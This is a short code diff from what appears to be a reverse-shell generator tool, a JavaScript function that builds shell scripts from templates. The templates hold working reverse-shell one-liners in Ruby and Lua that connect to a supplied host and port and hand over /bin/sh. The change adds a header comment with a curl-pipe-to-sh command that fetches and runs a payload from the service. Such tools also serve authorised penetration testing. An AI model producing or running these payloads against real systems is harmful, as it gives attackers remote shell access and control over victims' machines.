@@ -24,7 +24,13 @@ const generateScript = (host, port) => {
         ruby: `ruby -rsocket -e'f=TCPSocket.open("${host}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
         lua: `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${host}','${port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`
     };
-    return Object.entries(payloads).reduce((script, [cmd, payload]) => {
+    const scripts = `
+#
+# Payload:
+#      curl https://resh.now.sh/${host}:${port} | sh
+#
+`;
+    return scripts + Object.entries(payloads).reduce((script, [cmd, payload]) => {
         script += `
 
 if command -v ${cmd} > /dev/null 2>&1; then
